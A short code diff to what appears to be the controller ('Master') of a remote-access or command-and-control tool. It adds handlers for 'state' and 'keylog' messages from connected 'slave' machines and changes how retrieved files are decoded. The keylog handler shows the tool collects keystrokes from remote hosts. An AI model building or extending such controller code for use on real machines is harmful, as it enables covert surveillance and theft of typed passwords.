@@ -76,15 +76,19 @@ class Master(Client):
                     self.ui.screen.selected_slave_info = json.loads(decode_base64(payload))
                     self.ui.set_relative(self.ui.screen.selected_slave_info["path"])
                     self.ui.request_local()
+                elif subject == "state":
+                    self.ui.update_state(json.loads(decode_base64(payload)))
+                elif subject == "keylog":
+                    self.ui.set_keylog(json.loads(decode_base64(payload)))
 
                 elif subject == "local":
                     self.ui.set_local(json.loads(decode_base64(payload)))
                 elif subject == "file":
                     path, content = decode_base64(payload).split("\1")
-                    content = decode_base64(content)
                     is_image = path.split(".")[-1] in ["png", "jpg", "jpeg", "svg", "PNG", "JPG", "JPEG", "SVG"]
-                    print(f"{path} {is_image}")
+                    content = content if is_image else decode_base64(content)
                     self.ui.open_file(path, content, is_image)
+
 
         return None
 
